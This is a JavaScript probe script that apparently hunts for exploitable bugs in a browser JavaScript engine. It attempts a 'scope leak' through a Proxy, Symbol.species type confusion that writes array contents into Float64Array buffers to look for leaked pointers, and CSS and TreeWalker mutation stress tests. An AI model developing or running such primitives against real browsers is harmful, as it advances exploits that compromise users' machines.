// Scope leak exploitation + Symbol.species + CSS text edge cases
(function() {
'use strict';
var results = [];

function f64ToHex(v) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  var u = new Uint32Array(buf);
  return '0x' + u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
}

// Get the leaked scope object via super.foo Proxy trick
function getLeakedScope() {
  var leaked = null;
  var C = class extends class {} {
    constructor() {
      super();
      this.leak = 42;
    }
  };

  var handler = {
    get: function(target, prop, receiver) {
      if (prop === 'prototype') {
        leaked = target.prototype;
      }
      return Reflect.get(target, prop, receiver);
    }
  };

  var P = new Proxy(C, handler);
  try { new P(); } catch(e) {}

  return leaked;
}

// Test 1: Get and deeply inspect the leaked scope
try {
  var scope = getLeakedScope();
  if (!scope) {
    results.push({ name: 'scope_get', result: 'null' });
  } else {
    var r = {};
    r.type = typeof scope;
    r.constructor = scope.constructor ? scope.constructor.name : 'none';
    r.protoConstructor = Object.getPrototypeOf(scope) && Object.getPrototypeOf(scope).constructor ?
      Object.getPrototypeOf(scope).constructor.name : 'none';

    var keys = Object.getOwnPropertyNames(scope);
    r.ownKeys = keys;

    var syms = Object.getOwnPropertySymbols(scope);
    r.symbols = syms.map(function(s) { return s.toString(); });

    r.descriptors = {};
    keys.forEach(function(k) {
      try {
        var d = Object.getOwnPropertyDescriptor(scope, k);
        r.descriptors[k] = {
          type: typeof d.value,
          writable: d.writable,
          configurable: d.configurable
        };
        if (typeof d.value === 'function') {
          r.descriptors[k].fnStr = d.value.toString().substring(0, 80);
        }
      } catch(e) {
        r.descriptors[k] = { error: e.message.substring(0, 40) };
      }
    });

    // Walk prototype chain
    var chain = [];
    var p = scope;
    for (var i = 0; i < 10 && p; i++) {
      chain.push({
        c: p.constructor ? p.constructor.name : 'none',
        keys: Object.getOwnPropertyNames(p).length,
        syms: Object.getOwnPropertySymbols(p).length
      });
      p = Object.getPrototypeOf(p);
    }
    r.protoChain = chain;

    results.push({ name: 'scope_inspect', data: r });
  }
} catch(e) {
  results.push({ name: 'scope_get', error: e.message.substring(0, 80) });
}

// Test 2: Modify the leaked scope — does it corrupt anything?
try {
  var scope = getLeakedScope();
  if (scope) {
    // Add properties
    scope.__injected = 'HACK';
    scope.valueOf = function() { return 0xDEAD; };
    scope.toString = function() { return 'CORRUPTED'; };

    // Now create MANY instances using the class and check
    var C2 = class extends class {} {
      constructor() {
        super();
        this.data = 99;
      }
    };

    var instances = [];
    for (var i = 0; i < 10; i++) {
      instances.push(new C2());
    }

    // Check if any instance sees the injected property
    var affected = 0;
    for (var i = 0; i < instances.length; i++) {
      if (instances[i].__injected !== undefined) affected++;
    }

    // Check the prototype chain
    var chainCheck = [];
    var p = instances[0];
    for (var j = 0; j < 5 && p; j++) {
      chainCheck.push({
        hasInjected: '__injected' in p,
        injectedVal: p.__injected,
        c: p.constructor ? p.constructor.name : 'none'
      });
      p = Object.getPrototypeOf(p);
    }

    results.push({
      name: 'scope_modify',
      injectedSticks: scope.__injected === 'HACK',
      affected: affected,
      total: instances.length,
      chainCheck: chainCheck
    });
  }
} catch(e) {
  results.push({ name: 'scope_modify', error: e.message.substring(0, 80) });
}

// Test 3: Scope SC — can we serialize the leaked scope?
try {
  var scope2 = getLeakedScope();
  if (scope2) {
    try {
      var c = structuredClone(scope2);
      results.push({ name: 'scope_sc', result: 'CLONED', type: typeof c });
    } catch(e) {
      results.push({ name: 'scope_sc', error: e.message.substring(0, 60) });
    }

    try {
      history.replaceState({ s: scope2 }, '');
      var h = history.state;
      history.replaceState(null, '');
      results.push({
        name: 'scope_history',
        gotState: !!h,
        sType: h && h.s ? typeof h.s : 'none',
        sKeys: h && h.s ? Object.keys(h.s) : []
      });
    } catch(e) {
      results.push({ name: 'scope_history', error: e.message.substring(0, 60) });
    }
  }
} catch(e) {
  results.push({ name: 'scope_sc', error: e.message.substring(0, 80) });
}

// Test 4: Symbol.species exploitation — force Array methods to return typed arrays
try {
  var r4 = {};

  // Symbol.species that returns Float64Array constructor
  var SpeciesArray = class extends Array {
    static get [Symbol.species]() {
      return function(len) {
        var buf = new ArrayBuffer(len * 8);
        var obj = new Float64Array(buf);
        obj.__proto__ = Array.prototype;
        return obj;
      };
    }
  };

  var sa = new SpeciesArray(1.1, 2.2, 3.3, 4.4);

  try {
    var mapped = sa.map(function(x) { return x; });
    r4.mapType = typeof mapped;
    r4.mapIsF64 = mapped instanceof Float64Array;
    r4.mapIsArr = Array.isArray(mapped);
    r4.mapLen = mapped.length;
    r4.mapVal0 = mapped[0];
    if (mapped[0] && typeof mapped[0] === 'number') {
      r4.mapHex0 = f64ToHex(mapped[0]);
    }
  } catch(e) {
    r4.mapErr = e.message.substring(0, 60);
  }

  try {
    var filtered = sa.filter(function() { return true; });
    r4.filterType = typeof filtered;
    r4.filterLen = filtered.length;
  } catch(e) {
    r4.filterErr = e.message.substring(0, 60);
  }

  try {
    var sliced = sa.slice(0);
    r4.sliceType = typeof sliced;
    r4.sliceLen = sliced.length;
  } catch(e) {
    r4.sliceErr = e.message.substring(0, 60);
  }

  // Most interesting: species returning a Proxy
  try {
    var observed = [];
    var ProxySpecies = class extends Array {
      static get [Symbol.species]() {
        return function(len) {
          return new Proxy(new Array(len), {
            set: function(target, prop, value) {
              if (!isNaN(prop)) {
                observed.push({ idx: prop, type: typeof value, hex: typeof value === 'number' ? f64ToHex(value) : String(value).substring(0, 30) });
              }
              target[prop] = value;
              return true;
            }
          });
        };
      }
    };

    var pa = new ProxySpecies(1.1, 2.2, 3.3);
    // Inject an object into the array
    pa[0] = { secret: 42 };
    var mapped2 = pa.map(function(x) { return x; });
    r4.proxySpecies = observed.length;
    r4.proxyValues = observed.slice(0, 5);
  } catch(e) {
    r4.proxySpeciesErr = e.message.substring(0, 60);
  }

  results.push({ name: 'species', data: r4 });
} catch(e) {
  results.push({ name: 'species', error: e.message.substring(0, 80) });
}

// Test 5: valueOf/toString confusion — can we observe how JSC converts objects?
try {
  var r5 = {};

  // Object with valueOf that returns a specific pattern
  var marker = { valueOf: function() { return 3.14159; }, toString: function() { return 'marker'; } };

  // Store in array, then use SC confusion to see if pointer leaked
  var buf5 = new ArrayBuffer(64);
  new Uint8Array(buf5).fill(0);
  var f64_5 = new Float64Array(buf5);

  // Use the species trick: map an array containing objects through a Float64Array species
  try {
    var SA5 = class extends Array {
      static get [Symbol.species]() {
        return function(len) {
          return f64_5;
        };
      }
    };
    var arr5 = new SA5();
    arr5.push(marker, 42, marker, 99);
    var mapped5 = arr5.map(function(x) { return x; });

    // Read what got written to the Float64Array
    r5.f64_0 = f64ToHex(f64_5[0]);
    r5.f64_1 = f64ToHex(f64_5[1]);
    r5.f64_2 = f64ToHex(f64_5[2]);
    r5.f64_3 = f64ToHex(f64_5[3]);

    // Check with Uint32Array
    var u32_5 = new Uint32Array(buf5);
    r5.u32_0 = '0x' + (u32_5[0]>>>0).toString(16).padStart(8,'0');
    r5.u32_1 = '0x' + (u32_5[1]>>>0).toString(16).padStart(8,'0');
    r5.u32_2 = '0x' + (u32_5[2]>>>0).toString(16).padStart(8,'0');
    r5.u32_3 = '0x' + (u32_5[3]>>>0).toString(16).padStart(8,'0');
  } catch(e) {
    r5.speciesWrite = 'err:' + e.message.substring(0, 50);
  }

  results.push({ name: 'species_write', data: r5 });
} catch(e) {
  results.push({ name: 'species_write', error: e.message.substring(0, 80) });
}

// Test 6: CSS text processing edge cases
try {
  var container = document.createElement('div');
  container.style.cssText = 'width:200px;position:absolute;left:-9999px;top:0';
  document.body.appendChild(container);

  // RTL + bidi override + combining chars
  var p1 = document.createElement('p');
  p1.style.cssText = 'word-break:break-all;direction:rtl;unicode-bidi:bidi-override';
  p1.textContent = 'abc‮def‭ghi‏jkl';
  container.appendChild(p1);
  p1.offsetWidth;

  // text-overflow with narrow container
  var p2 = document.createElement('p');
  p2.style.cssText = 'text-overflow:ellipsis;overflow:hidden;white-space:nowrap;width:5px';
  p2.textContent = 'ABCDEFGHIJKLMNOP̀́̂̃̄';
  container.appendChild(p2);
  p2.offsetWidth;

  // text-transform uppercase of sharp s and other special mappings
  var p3 = document.createElement('p');
  p3.style.cssText = 'text-transform:uppercase';
  p3.textContent = 'ßıſﬁﬂ';
  container.appendChild(p3);
  p3.offsetWidth;

  // Rapid style mutation
  for (var i = 0; i < 50; i++) {
    p1.style.direction = i % 2 ? 'ltr' : 'rtl';
    p2.style.width = (1 + i % 10) + 'px';
    p3.style.textTransform = i % 3 === 0 ? 'uppercase' : i % 3 === 1 ? 'lowercase' : 'capitalize';
    container.offsetWidth;
  }

  container.remove();
  results.push({ name: 'css_text', result: 'survived' });
} catch(e) {
  results.push({ name: 'css_text', error: e.message.substring(0, 80) });
}

// Test 7: TreeWalker + DOM mutation
try {
  var div = document.createElement('div');
  div.innerHTML = '<span>a</span><span>b</span><span>c</span><span>d</span><span>e</span>';
  document.body.appendChild(div);

  var walker = document.createTreeWalker(div, NodeFilter.SHOW_ELEMENT, null, false);
  var visited = [];
  var node;

  while (node = walker.nextNode()) {
    visited.push(node.tagName);
    // Mutate DOM during walk
    if (visited.length === 2) {
      // Remove next sibling
      var next = node.nextSibling;
      if (next) next.remove();
      // Add new elements
      var newEl = document.createElement('b');
      newEl.textContent = 'injected';
      div.appendChild(newEl);
    }
  }

  div.remove();

  results.push({
    name: 'treewalker_mutation',
    visited: visited,
    result: 'survived'
  });
} catch(e) {
  results.push({ name: 'treewalker_mutation', error: e.message.substring(0, 80) });
}

return new Promise(function(resolve) {
  setTimeout(function() {
    resolve(JSON.stringify(results));
  }, 2000);
});
})();
